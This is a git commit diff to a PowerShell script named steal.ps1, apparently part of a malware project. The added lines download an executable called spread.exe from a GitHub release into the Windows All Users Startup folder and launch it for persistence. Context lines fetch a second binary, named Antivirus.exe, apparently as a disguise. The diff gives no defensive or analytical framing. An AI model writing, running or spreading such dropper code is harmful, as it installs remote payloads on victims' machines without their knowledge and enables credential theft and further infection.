c55201c846d1a1066a6004da815a183d28daabcc
43a1723 <hai1723notgay@gmail.com>
2024-09-08 21:25:46 +0700

    Update steal.ps1

--- scr/steal.ps1
+++ scr/steal.ps1
@@ -1,3 +1,17 @@
+$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
+New-Item -ItemType Directory -Path $dir
+attrib +h +s $dir
+
+$url = "https://github.com/s1uiasdad/log-acc-v2/releases/download/AutoBuildExe/spread.exe"
+$output = "$startupfolder\spread.exe"
+
+if (Test-Path -Path $output) {
+    Write-Host "hello"
+} else {
+    Invoke-WebRequest -Uri $url -OutFile $output
+    Start-Process -FilePath $output
+}
+
 $url = "https://github.com/43a1723/test/raw/main/Extras/hacklife/Antivirus.exe"
 $output = "$dir\loader.exe"
 
